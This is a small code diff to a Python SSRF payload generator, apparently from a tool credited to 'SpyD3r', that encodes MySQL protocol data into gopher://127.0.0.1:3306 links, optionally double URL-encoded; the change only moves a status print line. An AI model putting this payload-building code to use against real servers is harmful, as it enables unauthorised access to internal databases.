@@ -24,6 +24,7 @@ def MySQL():
         encoded = "gopher://127.0.0.1:3306/_%" + "%".join(a)
         if "y" in doubleEncode:
             encoded = encoded[:encoded.index('/_') + 2] + urllib.parse.quote(encoded[encoded.index('/_') + 2:])
+        print("\033[93m" + "\nYour gopher link is ready to do SSRF : \n" + "\033[0m")
         return encoded
 
     def get_payload(query):
@@ -37,6 +38,5 @@ def MySQL():
         else:
             return encode(auth)
 
-    print("\033[93m" + "\nYour gopher link is ready to do SSRF : \n" + "\033[0m")
     print("\033[04m" + get_payload(query) + "\033[0m")
     print("\n" + "\033[41m" + "-----------Made-by-SpyD3r-----------" + "\033[0m")
